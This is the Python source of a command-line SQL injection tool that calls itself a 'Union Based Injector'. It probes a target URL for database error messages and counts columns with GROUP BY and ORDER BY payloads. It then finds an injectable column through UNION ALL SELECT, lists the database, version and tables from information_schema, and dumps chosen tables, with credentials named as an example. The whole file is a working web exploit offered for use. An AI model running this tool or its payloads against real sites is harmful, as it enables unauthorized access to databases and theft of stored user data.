#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import urllib
import argparse
import sys
import re
import logging

"""
    Process:

    1. Identify existence of Error Message
    2. Identify column count (order by 1,2,3,4,---)
    3. Identify vulnerable column with keyword (union all select "I <3 MSF")
    4. Get the vulnerable column and display db, user
    5. Display Tables from the database
    6. Show option to select the table to query or table to Dump


    ---
    Add WAF Detection and Bypass
"""

sql_Error = [
            "You have an error in your SQL syntax",
            "error in your SQL syntax",
            "mysql_numrows()",
            "Input String was not in a correct format",
            "mysql_fetch",
            "num_rows",
            "Error Executing Database Query",
            "Unclosed quotation mark",
            "Error Occured While Processing Request",
            "Server Error",
            "Microsoft OLE DB Provider for ODBC Drivers Error",
            "Invalid Querystring",
            "VBScript Runtime"
            "Syntax Error",
            "GetArray()",
            "FetchRows()",
            "Not found"
            ]

# Set the following to True if you want to stop finding vuln column
# Once one had been found, which is enough for injection purpose
find_more_than_one_vuln_column = False

session_log = "sql-injector.log"

banner = """                                      
 _____ _____ __       _____     _         
|   __|     |  |     |  |  |___|_|___ ___ 
|__   |  |  |  |__   |  |  |   | | . |   |
|_____|__  _|_____|  |_____|_|_|_|___|_|_|
         |__|                             
------------------------
| Union Based Injector |
------------------------        
                                | zerouplink |
                                |┌∩┐(◣_◢)┌∩┐ |
                                | Hell yeah  |

"""
class website:

    def __init__(self):
        print(banner)
        self._initVar()
        self._parseArg()

    def _parseArg(self):
        """
        A function to parse the command argument
        And control the main program
        """
        parser = argparse.ArgumentParser(prog="Union Based SQL Injector",description="Union Based SQL injector")
        parser.add_argument("-t","--target", help="Target URL")
        parser.add_argument("-v","--verbose",help="Enable Verbose mode",action="store_true")
        # -d, --dump disabled until further notice
        # Until I figure out how to store logs to resume like sqlmap
        #parser.add_argument("-d","--dump", help="Dump the following table")
        args = parser.parse_args()

        if args.target == None:
            parser.print_help()
            sys.exit(1)

        elif args.target != None:

            if args.verbose:
                logging.basicConfig(format="%(levelname)s: %(message)s", level=logging.DEBUG)
                logging.info("Verbose mode Activated")
                self.verbose = True
            else:
                logging.basicConfig(format="%(levelname)s: %(message)s")

            try:
                self.url = URL(args.target).fullurl

                self.log = Log()
                self.fingered = self.log.check_log(self.url)

                if self.fingered:
                    print("[+] URL Detected in the Session Log file")
                    print("[+] Skipping Discovery Process, jumping to exploitation")
                    self.unionUrl = self.log.history
                    self.displayInfo()
                else:
                    self.testError()
                    self.columnCounterGroupBy()
                    # It'll automatically try Order By method if Group By doesn't work
                    self.FindVulnColumn()
                    self.displayInfo()

            except KeyboardInterrupt:
                print("\n[~] Exiting...")
            except Exception as e:
                logging.warning(e)
                print("\n[!] Error Occured")
                print(e)
                sys.exit(1)


    def _initVar(self):
        """
        A function kept separately to init variables
        """
        self.url           = ""
        self.vulnerable    = False
        self.errorMessage  = ""
        self.columnCount   = 0
        self.vulnColumn    = [] # Vulnerable column could be more than one column
        self.databases     = ""
        self.tables        = []
        self.unionUrl      = ""
        self.columnRange   = []

        self.verbose       = False
        self.waf           = False
        """ 
        I will add waf bypass soon, as soon as I figure out
        how to do that without repeating laborous manual query generation
        """

    def testError(self):
        print("[+] Testing webpage for sql errors")
        content = self.getpage(self.url)
        self.vulnerable = False
        self.errorMessage = ""

        # Look for error message
        for errmsg in sql_Error:
            if errmsg in content:
                self.vulnerable = True
                self.errorMessage = errmsg
                logging.info("[%s] captured " % errmsg)
                break

        if not self.vulnerable:
            print("[!] URL Doesn't seem to be vulnerable to SQLi")
            print("[!] Try other URL")
            sys.exit(1)
        else:
            print("[+] SQL Error Message Found")
            print("[+] [* %s *]" % self.errorMessage)


    def columnCounterOrderBy(self):
        print("[+] Counting Columns")
        baseUrl = self.url.replace("'","") + " ORDER BY "

        msg = "Error: Unknown column"

        for colno in range(1,101):
            injUrl = baseUrl + str(colno) + "--"

            logging.info(injUrl)
            page = self.getpage(injUrl)

            if not self.verbose:
                sys.stdout.write(str(" "+str(colno)))
                sys.stdout.flush()

            if msg in page:
                print("\n[+] Column Count = %d" % colno)
                self.columnCount = colno
                break
        if self.columnCount == 0:
            print("[!] Cannot find the column count!")
            print("[!] Target might be blocking Query with WAF")
            sys.exit(1)
            

    def columnCounterGroupBy(self):
        """
            2 Approaches

            1. Find column the normal way, order by 1000....
               Harder to detect a pattern between page saying "Unknown Column" or 
               Simply a page with content different or 404

            2. Find column with union select, therefore know the vulnerable column
               As well as the column count, but the column count may not be correct
               as it will stop as soon as the string injected is found inside the 
               html response

            Decided to try 2nd approach first, since the downfall is negligible

            3. Group By Method.

            Try Group By first, if it didn't work, do the normal way
        """
        print("[+] Counting Columns with 'Group-By' Technique")
        baseUrl = self.url.replace("'","").replace("=","=-")
        baseUrl += "+GROUP+BY+" + ",".join([str(i) for i in range(1,101)])+"--"
        logging.info(baseUrl)
        pattern = re.compile(r"Unknown column '(\d+)' in 'group statement'")
        page = self.getpage(baseUrl)
        if len(pattern.findall(page)) != 0:
            logging.info(pattern.findall(page))
            column = int(pattern.findall(page)[0]) - 1
            print("[+] Column count : %d" % column)
            self.columnCount = column
        else:
            column = 0
            print("[~] Could not find column with Group By")
            print("[~] Trying manual method with Order By")
            self.columnCounterOrderBy() 


    def FindVulnColumn(self):
        # Change this if needed to detect the WAF Firewall
        waf_string = "406 Not Acceptable"

        print("[+] Fuzzing Columns to get Injectable Column")
        inj_plain_msg = "I <3 MSF"
        inj_hex_msg   = "0x" + inj_plain_msg.encode('hex')

        baseUrl = self.url.replace("=","=-").replace("'","") + "+UNION+ALL+SELECT+"
        self.columnRange = ",".join([str(i) for i in range(1,self.columnCount+1)])

        for colno in range(1,self.columnCount+1):    
            injUrl = baseUrl + self.columnRange.replace(str(colno),inj_hex_msg) + "--"
            page = self.getpage(injUrl)

            if waf_string in page:
                logging.warning("!WAF Detected!")
                print("[!] Received HTTP Status code 406: Not Acceptable")
                print("[!] WAF Firewall Detected")
                print("[!] WAF bypass feature will be added in the next release")
                sys.exit(1)
            else:
                if inj_plain_msg in page:
                    sys.stdout.write(str(" [" + str(colno) + "]"))
                    self.vulnColumn.append(colno)

                    if not find_more_than_one_vuln_column: break

                else:
                    if not self.verbose:
                        sys.stdout.write(str(" " + str(colno)))
                        sys.stdout.flush()

        if self.vulnColumn == 0:
            print("\n[-] Vulnerable column couldn't be found")
            print("[-] Please try manually")
            sys.exit(1)
        else:
            print("\n[+] Vulnerable Column Number(s) : %s" % self.vulnColumn)

    def displayInfo(self):
        """ 
        Display Database name
        User, hosts, version... etc
        """
        if self.unionUrl == "":
            colnumbers = []
            for i in range(1,self.columnCount+1):
                if i == self.vulnColumn[0]:
                    colnumbers.append("!")
                    # Mark injection point with '!'
                else: colnumbers.append(i)

            self.unionUrl = self.url.strip("'").replace("=","=-") + "+UNION+ALL+SELECT+"
            self.unionUrl += ",".join([str(i) for i in colnumbers])

            self.log.write_log(self.unionUrl)

        else:
            pass        

        # Replace injection point '!' with query
        databaseUrl = self.unionUrl.replace('!',"group_concat(0x2e3a,database(),0x3a2e)")+"--"
        versionUrl = self.unionUrl.replace('!',"group_concat(0x2e3a,@@version,0x3a2e)")+"--"
        tableUrl = self.unionUrl.replace('!',"group_concat(0x2e3a,table_name,0x3a2e)").strip("--")
        tableUrl += "+from+information_schema.tables+where+table_schema=database()--"

        logging.info(databaseUrl)
        logging.info(versionUrl)
        logging.info(tableUrl)

        try:

            self.version = self.parse(self.getpage(versionUrl))[0]
            print("\n[+] Version   : %s" % self.version)

            self.databases = self.parse(self.getpage(databaseUrl))[0]
            print("[+] Databases : %s" % self.databases)


            self.tables = [str(i).strip(".:.") for i in self.parse(self.getpage(tableUrl))[0].split(",")]
            print("[+] Tables    : %s" % "\n\t\t".join([str(i) for i in self.tables]))
        except IndexError:
            with open("debug.html","w") as cf:
                cf.write(self.getpage(tableUrl))
            print("[!] Check Debug.html")
            sys.exit(1)

        tbl_choice = raw_input("Enter table name : ").lower()
        if tbl_choice in self.tables:
            self.dumpTable(tbl_choice)
        elif tbl_choice != "" & tbl_choice not in self.tables:
            print("[!] Table name [%s] is not in database" % tbl_choice)
        else:
            sys.exit(1)

    def parse(self,data):
        return re.findall("[.+]?\.\:(.+)\:\.[.+]?",data)

    def dumpTable(self,table):
        print("\n[+] Dumping table : %s" % table)
        columnUrl = self.unionUrl.replace('!',"group_concat(0x2e3a,column_name,0x3a2e)").strip("--") \
        +"+from+information_schema.columns+where+table_name=" + "0x" + table.encode('hex') + "--"

        logging.info(columnUrl)

        raw_data = self.parse(self.getpage(columnUrl))[0]
        columns = [str(i).strip(".:.") for i in raw_data.split(",")]

        if len(columns) > 0:
            print("\n[+] Columns : %s" % columns)
            self.extract_Data(columns,table)
        else:
            print("[-] No Columns Found")

    def extract_Data(self,column,table):
        try:
            concat = 'group_concat(0x2e3a,%s,0x3a2e)' % ",0x7c,".join([str(i) for i in column])
            # eg : 'group_concat(0x2e3a,id,0x7c,pass,0x7c,salt,0x3a2e'
            #                      .:   id   .  pass   .  salt   :.
            tail = "+from+%s--" % (self.databases+"."+table) 
            query = self.unionUrl.replace('!',concat) + tail

            logging.info(query)

            raw_data = self.parse(self.getpage(query))[0]
            data = [str(i).strip(".:.") for i in raw_data.split("|")]

            print("\n")
            print(data)

        except Exception:

            with open('debug.html','w') as cf:
                cf.write(self.getpage(query))
            print("[!] Check debug.html")

    def getpage(self, url):
        try:
            return urllib.urlopen(url).read()
        except IOError:
            print("[!] Network Error Occured")
            sys.exit(1)
        except Exception as e:
            logging.warning(e)
            print("[!] Error Occured")
            print(e)
            sys.exit(1)


class Log:
    def __init__(self):
        try: 
            open(session_log).read()
        except IOError:
            open(session_log,'w')
    def check_log(self,url):
        """
        To check if the given URL exists
        in the log file. 
        Returns True or False
        """
        data = self.read_log()
        self.data_Exist = False
        self.history = ""

        url = url[:url.index("=")]

        for item in data:
            if url in item:
                self.data_Exist = True
                self.history = item
                logging.info("Session Data found in log file \n%s" % self.history)

        return self.data_Exist

    def read_log(self):
        return [line.replace('\n', '') for line in open(session_log).readlines()]

    def write_log(self,url):
        with open(session_log,'a') as session:
            session.write(url)
        logging.info("Log Written : [%s]" % session_log)


class URL:
    def __init__(self,url):
        self.fullurl = url
        if not "http" in self.fullurl:
            self.fullurl = "http://" + self.fullurl
        if not "'" in self.fullurl:
            self.fullurl = self.fullurl + "'"
        if not "=" in self.fullurl:
            print("[!] No injection point defined")
            print("[!] URL need to have = in them")
            sys.exit(1)

if __name__ == "__main__":
    app = website()